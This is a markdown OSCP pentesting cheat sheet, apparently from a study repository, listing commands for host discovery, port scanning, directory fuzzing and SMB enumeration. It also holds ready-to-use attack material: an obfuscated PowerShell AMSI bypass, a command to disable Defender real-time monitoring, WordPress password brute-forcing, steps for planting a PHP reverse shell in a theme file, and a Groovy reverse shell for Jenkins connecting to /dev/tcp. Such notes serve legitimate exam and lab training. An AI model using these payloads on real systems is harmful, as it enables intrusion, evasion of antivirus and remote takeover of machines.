# OSCP_cheatsheet summary
* [General](#General)
   * [Buffer overflow](bufferoverflow.md)
   * [Metasploit](metasploit.md)
* [Enumeration](#Enumeration)
   * [Host Discovery](#Host-Discovery)
   * [Services](#Services)
        * [Most common ports](#Most-common-ports)
        * [Port Scanning Nmap](#port-scanning-Nmap)
   * [Web-applications](#Web-applications)
* [Exploitation](#Exploitation)
* [Privilege Escalation Windows](privesc_windows.md)
* [Privilege Escalation Linux](privesc_linux.md)
* [Post Exploitation](post_exploitation.md)

# General
## Other great cheatsheets
- https://github.com/CountablyInfinite/oscp_cheatsheet
- https://github.com/frizb/MSF-Venom-Cheatsheet/blob/master/README.md
#### Python error
When receiving the error “/usr/bin/env: ‘python\r’: No such file or directory when running an python exploit.
1.	Open the python file in vim
2.	Use the command ```:set ff=unix```
3.	Save the file. ```:wq```

#### SSH key files
ssh key files needs to be permission 600
```
sudo chmod 600 <FILE>
```

#### RDP commands
```
xfreerdp /d:<DOMAIN> /u:<USERNAME> /v:<TARGET IP< +clipboard
```

## cmd
#### Find string
```
| findstr /I “<FIND STRING>”
```

#### Ignore string
```
| findstr /v “<IGNORE STRING>” 
```

## Powershell
#### Powershell flags
- ```-nop```: (```-noprofile```) which instructs powershell not to load the powershell user profile.
-	```-w hidden```: to avoid creating a window on the user’s desktop
-	```-e```: (```-EncodedCommand```) use base64 encoding

#### Start as admin
```
powershell.exe Start-Process cmd.exe -Verb runAs
```

#### AMSI Bypass
```
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

#### Disbale AV (Requires local admin)
```
Set-MpPreference -DisableRealtimeMonitoring $true
```

### Powershell execution policy
#### Get execution policy
```
Get-ExecutionPolicy -Scope CurrentUser
```

#### Bypass execution policy flag
```
-ExecutionPolicy Bypass
```

#### Disable execution policy
```
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
```

## Compiling
#### Compile on linux
```
gcc
```

#### Cross compile exploit code
```
sudo apt install mingw-64
```

#### Compile 32bit
```
i686-w64-mingw32-gcc something.c -o something
```

# Enumeration
## Host Discovery
#### NMAP ping sweep
```
sudo nmap -sn <RANGE>
```

#### Netdiscover
```
sudo netdiscover -r <RANGE>
sudo netdisover -i <INTERFACE>
```

## Services / Port Scanning
### Most common ports
```
21: ftp
22: ssh
23: telnet
25: smtp
53: domain name system
80: http
110: pop3
111: rpcbind
135: msrpc
139: netbios-ssn
143: imap
443: https
445: microsoft-ds
993: imaps
995: pop3s
1723: pptp
3306: mysql
3389: ms-wbt-server
5900: vnc
8080: http-proxy
```

### Port scanning Nmap
#### Full TCP port scan
```
nmap <TARGET> -sV -sC -O -p- -vv -oA full_tcp_-<TARGET> 
```

#### Full UDP port scan
```
nmap <TARGET> -sU -sV -sC -p- -vv -oA full_udp_-<TARGET> 
```

#### Nmap scan most common ports wiht no host discovery
```
nmap <TARGET> -p 20,21,22,25,80,443,111,135,139,443,8080 -oA portsweep-<TARGET> 
nmap <TARGET> --top-ports 25 -oA portsweep_top25-<TARGET> 
```

#### Nmap scan all vulnerabilities
```
nmap <TARGET> -p- --script vuln -vv -oA vulnscan_-<TARGET> 
```

#### Usefull flags
- ```-Pn``` No ping #use if host says down but you know its up)
- ```-sn``` No port scan #use if you just want to scan a range to check if hosts are up.

#### HTTP Openproxy
If there is an open HTTP proxy, connect to it by configuring a proxy in your browser.

## Autorecon
https://github.com/Tib3rius/AutoRecon
```
autorecon -vv <IP>
```

## Web-applications
- Check the file extensions in URL’s to see what the application is running (.net .aspx .php etc)
- Inspect page content
- Check Firefox debugger for outdated javascript libraries
- Look for /robots.txt and /sitemap.xml

#### Find subdomains from html pages
```
curl <WEBPAGE>
grep -o '[^/]*\.<DOMAIN>\.com' index.html | sort -u > subdomains.txt
```

#### Screenshot a lot of http pages
Collect screenshot from list of ips
```
for ip in $(cat <IP FILE>); do cutycapt --url=$ip --out=$ip.png;done
```

Run the following bash script
```
#!/bin/bash
# Bash script to examine the scan results through HTML.
echo "<HTML><BODY><BR>" > web.html
ls -1 *.png | awk -F : '{ print $1":\n<BR><IMG SRC=\""$1""$2"\" width=600><BR>"}' >> w
eb.html
echo "</BODY></HTML>" >> web.html
```

### Vulnerability scanning - Nikto
Nikto is used for vulnerability scanning a web application.
```
nikto -host <URL> -output nikto-URL.txt
```

### Directory fuzzing
#### Dirb parameters
- ```-R``` to disable recursive scanning
- ```-p``` set up a proxy <IP:PORT>
- ```-X``` Append each word with this extensions.

#### Dirb Quick scan
```
dirb <URL> /usr/share/dirb/wordlists/big.txt -o dirb-<URL>.txt
```

#### Dirb Big wordlist
```
dirb <URL> /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -o dirb-<URL>.txt
```

#### Gobuster parameters
- use the ```-b``` flag to blacklist status codes.

#### Gobuster Quick scan
```
gobuster dir -w /opt/SecLists/Discovery/Web-Content/big.txt -u <URL> gobuster-<URL>.txt
```

#### Gobuster Big wordlist
```
gobuster dir -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u <URL> gobuster-<URL>.txt
```

### Wordpress
#### Scan Wordpress
```
wpscan -url <URL>
```

#### Bruteforce login
```
wpscan --url <URL> --usernames <USERNAME> --passwords /usr/share/wordlists/rockyou.txt --max-threads 50
```

#### Upload a reveare shell
1. Login --> Appearance --> Theme editor --> 404.php
2. gedit /usr/share/webshells/php/php-reverse-shell.php
3. Paste in 404.php
4. Start listener and go to an unexisting page in the browser

### Jenkings
#### Execute commands
- After login go to /script

#### Reverse java shell
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<IP>/<PORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### SMTP
#### Enumerate emails accounts
```
nc -nv <IP> 25
VRFY root
VRFY idontexist
Check output
```

### Shares SMB
#### Nmap enumerate SMB shares
```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <IP>
```

#### Enum4linux
Gotta try this: https://github.com/cddmp/enum4linux-ng
```
enum4linux <IP>
```


#### SMBClient list shares
```
smbclient -L <IP>
smbclient -L <IP>  -U '<USER>'%'<PASS>'
```

#### SMBClient connect to share
```
smbclient //<IP>/<SHARE>
```

#### SMBClient connect to share
```
smbclient //<IP>/<SHARE>
```

#### Download smb files recursively
```
get <FILE NAME>-
smbget -R smb://<IP>/<SHARE>
```

### Shares RPC
#### Nmap enumerate RPC shares
```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <IP>
```

### General
#### Find dangerous HTTP methods
https://www.sans.org/reading-room/whitepapers/testing/penetration-testing-web-application-dangerous-http-methods-33945
```
curl -v -X OPTIONS http://website/directory
#HTTP options such as PUT, Delete are bad
```
